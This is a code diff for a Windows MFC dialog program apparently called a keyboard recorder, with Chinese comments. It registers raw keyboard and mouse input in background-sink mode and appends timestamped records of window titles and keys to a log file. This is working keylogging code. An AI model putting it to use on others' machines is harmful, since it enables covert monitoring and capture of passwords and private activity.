@@ -206,37 +206,27 @@ void CKeyBoardRecordDlg::OnBnClickedButton2()
 	//主要用到RegisterRawInputDevices(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-registerrawinputdevices)
 
 	//设置RAWINPUTDEVICE 结构体的信息
-	RAWINPUTDEVICE rawInputDevice{};
-	rawInputDevice.usUsagePage = 0x01; //指向原始输入设备的顶级集合使用的页面
-	rawInputDevice.usUsage = 0x06;  //指向原始输入设备的顶级集合的用法
-	rawInputDevice.dwFlags = RIDEV_INPUTSINK;   //模式标志 指定如何解释由usUsagePage和usUsage提供的信息 RIDEV_INPUTSINK表示即使程序不处于上层窗口或是激活窗口，程序依然可以接收原始输入，但是，结构体成员hwndTarget必须要指定
-	rawInputDevice.hwndTarget = m_hWnd; //指向目标窗口的句柄，如果是NULL，则它会遵循键盘焦点
+	//RAWINPUTDEVICE rawInputDevice{};
+	//rawInputDevice.usUsagePage = 0x01; //指向原始输入设备的顶级集合使用的页面
+	//rawInputDevice.usUsage = 0x06;  //指向原始输入设备的顶级集合的用法
+	//rawInputDevice.dwFlags = RIDEV_INPUTSINK;   //模式标志 指定如何解释由usUsagePage和usUsage提供的信息 RIDEV_INPUTSINK表示即使程序不处于上层窗口或是激活窗口，程序依然可以接收原始输入，但是，结构体成员hwndTarget必须要指定
+	//rawInputDevice.hwndTarget = m_hWnd; //指向目标窗口的句柄，如果是NULL，则它会遵循键盘焦点
 
-	/*
-	* 可以捕获鼠标和键盘消息
-	* 不过捕获的鼠标位置是基于窗体的
-	* 如果用桌面的句柄(GetDesktopWindow)，会注册失败
-	* 所以换了种方式来捕获鼠标
-	* RAWINPUTDEVICE Rid[2];
-        
+	RAWINPUTDEVICE Rid[2];
+
 	Rid[0].usUsagePage = 0x01;          // HID_USAGE_PAGE_GENERIC
 	Rid[0].usUsage = 0x02;              // HID_USAGE_GENERIC_MOUSE
-	Rid[0].dwFlags = RIDEV_INPUTSINK;    
+	Rid[0].dwFlags = RIDEV_INPUTSINK;
 	Rid[0].hwndTarget = m_hWnd;
 
 	Rid[1].usUsagePage = 0x01;          // HID_USAGE_PAGE_GENERIC
 	Rid[1].usUsage = 0x06;              // HID_USAGE_GENERIC_KEYBOARD
-	Rid[1].dwFlags = RIDEV_INPUTSINK;    
+	Rid[1].dwFlags = RIDEV_INPUTSINK;
 	Rid[1].hwndTarget = m_hWnd;
 
-	if (RegisterRawInputDevices(Rid, 2, sizeof(Rid[0])) == FALSE)
-	{
-		//registration failed. Call GetLastError for the cause of the error
-	}
-	*/
 
 	//注册原始输入设备
-	BOOL bRet = ::RegisterRawInputDevices(&rawInputDevice, 1, sizeof(rawInputDevice));
+	BOOL bRet = ::RegisterRawInputDevices(Rid, 2, sizeof(Rid[0]));
 
 	if (FALSE == bRet)
 	{
@@ -270,13 +260,21 @@ void CKeyBoardRecordDlg::OnRawInput(UINT nInputcode, HRAWINPUT hRawInput)
 	//todo register
 	else if (RIM_TYPEMOUSE == rawinputData.header.dwType)
 	{	
-		POINT point{ rawinputData.data.mouse.lLastX ,rawinputData.data.mouse.lLastY };
-		
-		HWND hwnd = ::ChildWindowFromPoint(m_hWnd, point);
+		POINT pp{ rawinputData.data.mouse.lLastX,rawinputData.data.mouse.lLastY };
+		::ClientToScreen(m_hWnd,&pp);
 
-		TCHAR buf[MAX_PATH]{};
-		::GetWindowText(hwnd, buf, MAX_PATH);
-		AfxMessageBox(buf);
+		//HWND hwnd = ::WindowFromPoint(pp);
+
+		auto hwnd = ::ChildWindowFromPoint(::GetDesktopWindow(), pp);
+
+		if (hwnd)
+		{
+			TCHAR buf[MAX_PATH]{};
+			::GetWindowText(hwnd, buf, MAX_PATH);
+			
+			if(lstrlen(buf) > 0)
+				SaveKeyToFile(buf, 0);
+		}									
 	}
 
 	CDialogEx::OnRawInput(nInputcode, hRawInput);
@@ -313,6 +311,40 @@ BOOL CKeyBoardRecordDlg::SaveKeyToFile(USHORT usVkey)
 	}
 
 	DWORD dwSize = 0; 
+	WORD a = 0xfeff;
+	WriteFile(hFile, &a, 2, &dwSize, NULL);
+	WriteFile(hFile, szText, lstrlen(szText) * sizeof(TCHAR), &dwSize, NULL);
+	CloseHandle(hFile);
+	return TRUE;
+}
+
+BOOL CKeyBoardRecordDlg::SaveKeyToFile(LPTSTR szWindowText,UINT nType)
+{
+	TCHAR szTile[MAX_PATH]{};
+	TCHAR szText[MAX_PATH]{};
+	TCHAR szFile[MAX_PATH]{};
+
+	//获取文件路径
+	((CEdit*)GetDlgItem(IDC_EDIT1))->GetWindowTextW(szFile, MAX_PATH);
+
+	//顶层窗口
+	HWND hwnd = ::GetForegroundWindow();
+
+	//窗口标题
+	::GetWindowText(hwnd, szTile, MAX_PATH);
+
+	SYSTEMTIME sysTime{};
+	GetLocalTime(&sysTime);
+	//写入文件的字符串
+	wsprintf(szText, L"[%d/%d/%d %02d:%02d:%02d][%s]- %s\r\n", sysTime.wYear, sysTime.wMonth, sysTime.wDay, sysTime.wHour, sysTime.wMinute, sysTime.wSecond, szTile, szWindowText);
+
+	auto hFile = CreateFile(szFile, FILE_APPEND_DATA, FILE_SHARE_WRITE, nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+	if (INVALID_HANDLE_VALUE == hFile)
+	{
+		return FALSE;
+	}
+
+	DWORD dwSize = 0;
 	WORD a = 0xfeff;
 	WriteFile(hFile, &a, 2, &dwSize, NULL);
 	WriteFile(hFile, szText, lstrlen(szText) * sizeof(TCHAR), &dwSize, NULL);
